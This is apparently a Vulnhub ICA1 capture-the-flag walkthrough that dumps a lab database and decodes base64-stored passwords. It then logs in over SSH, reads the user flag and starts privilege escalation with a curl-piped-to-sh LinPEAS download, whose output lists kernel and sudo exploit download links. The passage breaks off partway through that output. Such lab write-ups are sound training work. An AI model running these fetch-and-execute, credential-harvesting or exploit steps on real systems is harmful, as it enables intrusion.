+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Support MariaDB developers by giving a star at https://github.com/MariaDB/server
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> 
+
+MySQL [qdpm]> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| qdpm               |
+| staff              |
+| sys                |
++--------------------+
+6 rows in set (0.003 sec)
+
+MySQL [qdpm]> USE staff;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [staff]> SHOW TABLES;
++-----------------+
+| Tables_in_staff |
++-----------------+
+| department      |
+| login           |
+| user            |
++-----------------+
+3 rows in set (0.004 sec)
+
+MySQL [staff]> SELECT * FROM user;
++------+---------------+--------+---------------------------+
+| id   | department_id | name   | role                      |
++------+---------------+--------+---------------------------+
+|    1 |             1 | Smith  | Cyber Security Specialist |
+|    2 |             2 | Lucas  | Computer Engineer         |
+|    3 |             1 | Travis | Intelligence Specialist   |
+|    4 |             1 | Dexter | Cyber Security Analyst    |
+|    5 |             2 | Meyer  | Genetic Engineer          |
++------+---------------+--------+---------------------------+
+5 rows in set (0.040 sec)
+
+MySQL [staff]> SELECT * FROM login;
++------+---------+--------------------------+
+| id   | user_id | password                 |
++------+---------+--------------------------+
+|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
+|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
+|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
+|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
+|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
++------+---------+--------------------------+
+5 rows in set (0.037 sec)
+
+
+
+we got some users and pass hashes that seem to use base64 as encoding. We can decode them:
+                                                                                                                                                                                             
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/ICA1]
+└─$ echo "c3VSSkFkR3dMcDhkeTNyRg==" | base64 -d                                                                                        
+suRJAdGwLp8dy3rF                                                                                                                                                                                               
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/ICA1]
+└─$ echo "N1p3VjRxdGc0MmNtVVhHWA==" | base64 -d 
+7ZwV4qtg42cmUXGX                                                                                                                                                                                             
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/ICA1]
+└─$ echo "WDdNUWtQM1cyOWZld0hkQw==" | base64 -d 
+X7MQkP3W29fewHdC                                                                                                                                                                                             
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/ICA1]
+└─$ echo "REpjZVZ5OThXMjhZN3dMZw==" | base64 -d 
+DJceVy98W28Y7wLg                                                                                                                                                                                             
+┌──(gabi㉿kali)-[~/Documents/Vulnhub/ICA1]
+└─$ echo "Y3FObkJXQ0J5UzJEdUpTeQ==" | base64 -d
+cqNnBWCByS2DuJSy                       
+
+we can use 2 credentials to log in to the victim machine:
+
+travis: DJceVy98W28Y7wLg
+
+ssh travis@10.0.2.8                    
+The authenticity of host '10.0.2.8 (10.0.2.8)' can't be established.
+ED25519 key fingerprint is SHA256:xCJPzSxRekyYT6eXmyzAXdY7uAlP5b7vQp+B5XqYsfE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.2.8' (ED25519) to the list of known hosts.
+travis@10.0.2.8's password: 
+Permission denied, please try again.
+travis@10.0.2.8's password: 
+Linux debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Sep 25 14:55:01 2021 from 192.168.1.7
+travis@debian:~$ 
+
+And dexter:7ZwV4qtg42cmUXGX
+
+ssh dexter@10.0.2.8                    
+dexter@10.0.2.8's password: 
+Linux debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Sep 25 08:43:19 2021 from 192.168.1.3
+dexter@debian:~$ 
+
+
+
+Using dexter user we find this info:
+dexter@debian:~$ ls
+note.txt
+dexter@debian:~$ cat note.txt
+It seems to me that there is a weakness while accessing the system.
+As far as I know, the contents of executable files are partially viewable.
+I need to find out if there is a vulnerability or not.
+dexter@debian:~$ 
+
+
+using travis, we find the user flag:
+travis@debian:~$ ls
+user.txt
+travis@debian:~$ cat user.txt
+ICA{Secret_Project}
+
+
+PRIV ESC:
+
+
+linpeas dump:
+
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+    /---------------------------------------------------------------------------------\
+    |                             Do you like PEASS?                                  |                                                                                                      
+    |---------------------------------------------------------------------------------|                                                                                                      
+    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |                                                                                                      
+    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                      
+    |         Respect on HTB            :     SirBroccoli                             |                                                                                                      
+    |---------------------------------------------------------------------------------|                                                                                                      
+    |                                 Thank you!                                      |                                                                                                      
+    \---------------------------------------------------------------------------------/                                                                                                      
+          LinPEAS-ng by carlospolop                                                                                                                                                          
+                                                                                                                                                                                             
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                
+                                                                                                                                                                                             
+Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
+ LEGEND:                                                                                                                                                                                     
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look to it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMagenta: Your username
+
+ Starting LinPEAS. Caching Writable Folders...
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                          
+                               ╚═══════════════════╝                                                                                                                                         
+OS: Linux version 5.10.0-8-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.46-5 (2021-09-23)
+User & Groups: uid=1001(dexter) gid=1001(dexter) groups=1001(dexter)
+Hostname: debian
+
+[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
+[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                      
+[+] /usr/bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)                                                           
+                                                                                                                                                                                             
+
+Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
+                                                                                                                                                                                             
+                              ╔════════════════════╗
+══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                           
+                              ╚════════════════════╝                                                                                                                                         
+╔══════════╣ Operative system
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                                                            
+Linux version 5.10.0-8-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.46-5 (2021-09-23)       
+Distributor ID: Debian
+Description:    Debian GNU/Linux 11 (bullseye)
+Release:        11
+Codename:       bullseye
+
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                                                               
+Sudo version 1.9.5p2                                                                                                                                                                         
+
+
+╔══════════╣ PATH
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                                                       
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games                                                                                                                                     
+
+╔══════════╣ Date & uptime
+Tue 10 Jun 2025 08:22:58 AM EDT                                                                                                                                                              
+ 08:22:58 up 7 min,  2 users,  load average: 0.67, 0.19, 0.05
+
+╔══════════╣ Unmounted file-system?
+╚ Check if you can mount umounted devices                                                                                                                                                    
+UUID=a7d180ef-b4a8-4310-a9b5-0ea33dfa608c /               ext4    errors=remount-ro 0       1                                                                                                
+/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
+
+╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
+disk                                                                                                                                                                                         
+sda
+sda1
+
+╔══════════╣ Environment
+╚ Any private information inside environment variables?                                                                                                                                      
+USER=dexter                                                                                                                                                                                  
+SSH_CLIENT=10.0.2.4 45722 22
+SHLVL=0
+MOTD_SHOWN=pam
+HOME=/home/dexter/
+OLDPWD=/home/dexter/
+SSH_TTY=/dev/pts/1
+LOGNAME=dexter
+_=/usr/bin/sh
+TERM=xterm-256color
+XDG_RUNTIME_DIR=/run/user/1001
+LANG=en_US.UTF-8
+SHELL=/bin/bash
+PWD=/home
+SSH_CONNECTION=10.0.2.4 45722 10.0.2.8 22
+
+╔══════════╣ Searching Signature verification failed in dmesg
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                                                        
+dmesg Not Found                                                                                                                                                                              
+                                                                                                                                                                                             
+╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                           
+[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops                                                                                                                               
+
+   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
+   Exposure: probable
+   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
+   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
+   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
+
+[+] [CVE-2022-0847] DirtyPipe
+
+   Details: https://dirtypipe.cm4all.com/
+   Exposure: probable
+   Tags: ubuntu=(20.04|21.04),[ debian=11 ]
+   Download URL: https://haxx.in/files/dirtypipez.c
+
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+
+   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+   Exposure: less probable
+   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
+   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2022-2586] nft_object UAF
+
+   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+   Exposure: less probable
+   Tags: ubuntu=(20.04){kernel:5.12.13}
+   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: mint=19,ubuntu=18|20, debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: less probable
+   Tags: ubuntu=20.04{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
+
+
+╔══════════╣ Protections
+═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                
+apparmor module is loaded.
+═╣ AppArmor profile? .............. unconfined
+═╣ is linuxONE? ................... s390x Not Found
+═╣ grsecurity present? ............ grsecurity Not Found                                                                                                                                     
+═╣ PaX bins present? .............. PaX Not Found                                                                                                                                            
+═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                     
+═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                       
+═╣ Seccomp enabled? ............... disabled                                                                                                                                                 
+═╣ User namespace? ................ enabled
+═╣ Cgroup2 enabled? ............... enabled
+═╣ Is ASLR enabled? ............... Yes
+═╣ Printer? ....................... No
+═╣ Is this a virtual machine? ..... Yes (oracle)                                                                                                                                             
+
+╔══════════╣ Kernel Modules Information
+══╣ Kernel modules with weak perms?                                                                                                                                                          
+                                                                                                                                                                                             
+══╣ Kernel modules loadable? 
+Modules can be loaded                                                                                                                                                                        
+
+
+
+                                   ╔═══════════╗
+═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                          
+                                   ╚═══════════╝                                                                                                                                             
+╔══════════╣ Container related tools present (if any):
+/usr/sbin/apparmor_parser                                                                                                                                                                    
+/usr/bin/nsenter
+/usr/bin/unshare
+/usr/sbin/chroot
+/usr/sbin/capsh
+/usr/sbin/setcap
+/usr/sbin/getcap
+
+╔══════════╣ Container details
+═╣ Is this a container? ........... No                                                                                                                                                       
+═╣ Any running containers? ........ No                                                                                                                                                       
+                                                                                                                                                                                             
+
+
+                                     ╔═══════╗
+═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                          
+                                     ╚═══════╝                                                                                                                                               
+Learn and practice cloud hacking techniques in https://training.hacktricks.xyz
+                                                                                                                                                                                             
+═╣ GCP Virtual Machine? ................. No
+═╣ GCP Cloud Funtion? ................... No
+═╣ AWS ECS? ............................. No
+═╣ AWS EC2? ............................. No
+═╣ AWS EC2 Beanstalk? ................... No
+═╣ AWS Lambda? .......................... No
+═╣ AWS Codebuild? ....................... No
+═╣ DO Droplet? .......................... No
+═╣ IBM Cloud VM? ........................ No
+═╣ Azure VM or Az metadata? ............. No
+═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
+═╣ Azure Automation Account? ............ No
+═╣ Aliyun ECS? .......................... No
+═╣ Tencent CVM? ......................... No
+
+
+
+                ╔════════════════════════════════════════════════╗
+════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                           
+                ╚════════════════════════════════════════════════╝                                                                                                                           
+╔══════════╣ Running processes (cleaned)
+╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                                  
+root           1  0.2  1.0  98092 10012 ?        Ss   08:15   0:01 /sbin/init                                                                                                                
+root         172  0.0  1.6  64676 16792 ?        Ss   08:15   0:00 /lib/systemd/systemd-journald
+root         197  0.0  0.5  21528  5272 ?        Ss   08:15   0:00 /lib/systemd/systemd-udevd
+systemd+     250  0.0  0.5  88376  5932 ?        Ssl  08:15   0:00 /lib/systemd/systemd-timesyncd
+  └─(Caps) 0x0000000002000000=cap_sys_time
+root         320  0.0  0.5  99824  5968 ?        Ssl  08:15   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
+root         337  0.0  0.2   6684  2864 ?        Ss   08:15   0:00 /usr/sbin/cron -f
+message+     338  0.0  0.4   8220  4196 ?        Ss   08:15   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  └─(Caps) 0x0000000020000000=cap_audit_write
+root         353  0.0  0.4 220740  4092 ?        Ssl  08:15   0:00 /usr/sbin/rsyslogd -n -iNONE
+root         354  0.0  0.7  22120  7084 ?        Ss   08:15   0:00 /lib/systemd/systemd-logind
+root         362  0.0  0.5  14560  5128 ?        Ss   08:15   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
+root         417  0.0  0.1   5784  1612 tty1     Ss+  08:15   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
+travis       664  0.0  0.5  14668  5972 ?        S    08:18   0:00  |   _ sshd: travis@pts/0
+travis       665  0.0  0.4   8100  4924 pts/0    Ss+  08:18   0:00  |       _ -bash
+dexter       704  0.2  0.6  14652  6296 ?        S    08:19   0:00      _ sshd: dexter@pts/1
+dexter       705  0.0  0.4   8104  4984 pts/1    Ss   08:19   0:00          _ -bash
+dexter       719  0.2  1.2  96368 12920 pts/1    S+   08:22   0:00              _ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+dexter       720  0.2  0.2   3272  2596 pts/1    S+   08:22   0:00              _ sh
+dexter      3802  0.0  0.1   3272  1008 pts/1    S+   08:23   0:00                  _ sh
+dexter      3806  0.0  0.3   9852  3432 pts/1    R+   08:23   0:00                  |   _ ps fauxwww
+dexter      3805  0.0  0.1   3272  1008 pts/1    S+   08:23   0:00                  _ sh
+root         488  0.0  2.1 196700 21836 ?        Ss   08:15   0:00 /usr/sbin/apache2 -k start
+www-data     506  0.0  1.0 197160 10968 ?        S    08:15   0:00  _ /usr/sbin/apache2 -k start
+www-data     507  0.0  1.0 197144 10968 ?        S    08:15   0:00  _ /usr/sbin/apache2 -k start
+www-data     508  0.0  1.0 197144 10968 ?        S    08:15   0:00  _ /usr/sbin/apache2 -k start
+www-data     509  0.0  1.0 197144 10968 ?        S    08:15   0:00  _ /usr/sbin/apache2 -k start
+www-data     510  0.0  1.0 197144 10968 ?        S    08:15   0:00  _ /usr/sbin/apache2 -k start
+mysql        492  1.0 42.6 1287312 426692 ?      Ssl  08:15   0:04 /usr/sbin/mysqld
+travis       641  0.0  0.8  15064  8456 ?        Ss   08:18   0:00 /lib/systemd/systemd --user
+travis       642  0.0  0.2 101044  2484 ?        S    08:18   0:00  _ (sd-pam)
+dexter       681  0.0  0.8  15068  8440 ?        Ss   08:19   0:00 /lib/systemd/systemd --user
+dexter       682  0.0  0.2 101044  2516 ?        S    08:19   0:00  _ (sd-pam)
+
+╔══════════╣ Processes with unusual configurations
+                                                                                                                                                                                             
+╔══════════╣ Processes with credentials in memory (root req)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                                                                            
+gdm-password Not Found                                                                                                                                                                       
+gnome-keyring-daemon Not Found                                                                                                                                                               
+lightdm Not Found                                                                                                                                                                            
+vsftpd Not Found                                                                                                                                                                             
+apache2 process found (dump creds from memory as root)                                                                                                                                       
+sshd: process found (dump creds from memory as root)
+mysql process found (dump creds from memory as root)
+postgres Not Found
+redis-server Not Found                                                                                                                                                                       
+mongod Not Found                                                                                                                                                                             
+memcached Not Found                                                                                                                                                                          
+elasticsearch Not Found                                                                                                                                                                      
+jenkins Not Found                                                                                                                                                                            
+tomcat Not Found                                                                                                                                                                             
+nginx Not Found                                                                                                                                                                              
+php-fpm Not Found                                                                                                                                                                            
+supervisord Not Found                                                                                                                                                                        
+vncserver Not Found                                                                                                                                                                          
+xrdp Not Found                                                                                                                                                                               
+teamviewer Not Found                                                                                                                                                                         
+                                                                                                                                                                                             
+╔══════════╣ Opened Files by processes
+Process 681 (dexter) - /lib/systemd/systemd --user                                                                                                                                           
+  └─ Has open files:
+    └─ /proc/681/mountinfo
+    └─ /proc/swaps
+    └─ /sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service
+Process 705 (dexter) - -bash 
+  └─ Has open files:
+    └─ /dev/pts/1
+Process 720 (dexter) - sh 
+  └─ Has open files:
+    └─ pipe:[13865]
+    └─ /dev/pts/1
+Process 7911 (dexter) - sh 
+  └─ Has open files:
+    └─ pipe:[13865]
+    └─ pipe:[34956]
+    └─ /dev/pts/1
+
+╔══════════╣ Processes with memory-mapped credential files
+                                                                                                                                                                                             
+╔══════════╣ Processes whose PPID belongs to a different user (not root)
+╚ You will know if a user can somehow spawn processes as a different user                                                                                                                    
+                                                                                                                                                                                             
+╔══════════╣ Files opened by processes belonging to other users
+╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                           
+                                                                                                                                                                                             
+╔══════════╣ Check for vulnerable cron jobs
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                                                         
+══╣ Cron jobs list                                                                                                                                                                           
+/usr/bin/crontab                                                                                                                                                                             
+incrontab Not Found
+-rw-r--r-- 1 root root    1042 Feb 22  2021 /etc/crontab                                                                                                                                     
+
+/etc/cron.d:
+total 24
+drwxr-xr-x  2 root root 4096 Sep 25  2021 .
+drwxr-xr-x 80 root root 4096 Jun 10 08:19 ..
+-rw-r--r--  1 root root  285 Feb  6  2021 anacron
+-rw-r--r--  1 root root  201 Jun  7  2021 e2scrub_all
+-rw-r--r--  1 root root  712 May 11  2020 php
+-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
+
+/etc/cron.daily:
+total 36
+drwxr-xr-x  2 root root 4096 Sep 25  2021 .
+drwxr-xr-x 80 root root 4096 Jun 10 08:19 ..
+-rwxr-xr-x  1 root root  311 Feb  6  2021 0anacron
+-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2
+-rwxr-xr-x  1 root root 1478 Jun 10  2021 apt-compat
+-rwxr-xr-x  1 root root 1298 Jan 30  2021 dpkg
+-rwxr-xr-x  1 root root  377 Feb 28  2021 logrotate
+-rwxr-xr-x  1 root root 1123 Feb 19  2021 man-db
+-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Sep 25  2021 .
+drwxr-xr-x 80 root root 4096 Jun 10 08:19 ..
+-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
+
+/etc/cron.monthly:
+total 16
+drwxr-xr-x  2 root root 4096 Sep 25  2021 .
+drwxr-xr-x 80 root root 4096 Jun 10 08:19 ..
+-rwxr-xr-x  1 root root  313 Feb  6  2021 0anacron
+-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x  2 root root 4096 Sep 25  2021 .
+drwxr-xr-x 80 root root 4096 Jun 10 08:19 ..
+-rwxr-xr-x  1 root root  312 Feb  6  2021 0anacron
+-rwxr-xr-x  1 root root  813 Feb 19  2021 man-db
+-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
+
+/var/spool/anacron:
+total 20
+drwxr-xr-x 2 root root 4096 Sep 25  2021 .
+drwxr-xr-x 5 root root 4096 Sep 25  2021 ..
+-rw------- 1 root root    9 Jun 10 03:57 cron.daily
+-rw------- 1 root root    9 Jun 10 04:07 cron.monthly
+-rw------- 1 root root    9 Jun 10 04:02 cron.weekly
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+HOME=/root
+LOGNAME=root
+
+1       5       cron.daily      run-parts --report /etc/cron.daily
+7       10      cron.weekly     run-parts --report /etc/cron.weekly
+@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly
+
+══╣ Checking for specific cron jobs vulnerabilities
+Checking cron directories...                                                                                                                                                                 
+
+╔══════════╣ System timers
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                                                     
+══╣ Active timers:                                                                                                                                                                           
+NEXT                        LEFT          LAST                        PASSED       UNIT                         ACTIVATES                                                                    
+Tue 2025-06-10 08:30:08 EDT 6min left     Tue 2025-06-10 04:01:07 EDT 4h 22min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
+Tue 2025-06-10 08:30:09 EDT 6min left     n/a                         n/a          systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+Tue 2025-06-10 08:31:06 EDT 7min left     Tue 2025-06-10 08:16:15 EDT 7min ago     anacron.timer                anacron.service
+Tue 2025-06-10 08:39:00 EDT 15min left    Tue 2025-06-10 08:15:11 EDT 8min ago     phpsessionclean.timer        phpsessionclean.service
+Tue 2025-06-10 10:51:14 EDT 2h 27min left Fri 2025-06-06 04:58:22 EDT 4 days ago   apt-daily.timer              apt-daily.service
+Wed 2025-06-11 00:00:00 EDT 15h left      Tue 2025-06-10 03:52:36 EDT 4h 30min ago logrotate.timer              logrotate.service
+Wed 2025-06-11 00:00:00 EDT 15h left      Tue 2025-06-10 03:52:36 EDT 4h 30min ago man-db.timer                 man-db.service
+Sun 2025-06-15 03:10:25 EDT 4 days left   Tue 2025-06-10 03:52:37 EDT 4h 30min ago e2scrub_all.timer            e2scrub_all.service
+Mon 2025-06-16 00:36:01 EDT 5 days left   Tue 2025-06-10 04:06:42 EDT 4h 16min ago fstrim.timer                 fstrim.service
+══╣ Disabled timers:
+══╣ Additional timer files:                                                                                                                                                                  
+                                                                                                                                                                                             
+╔══════════╣ Services and Service Files
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                                                                                   
+                                                                                                                                                                                             
+══╣ Active services:
+apache2.service                    loaded active running The Apache HTTP Server                                                                                                              
+apparmor.service                   loaded active exited  Load AppArmor profiles
+console-setup.service              loaded active exited  Set console font and keymap
+cron.service                       loaded active running Regular background program processing daemon
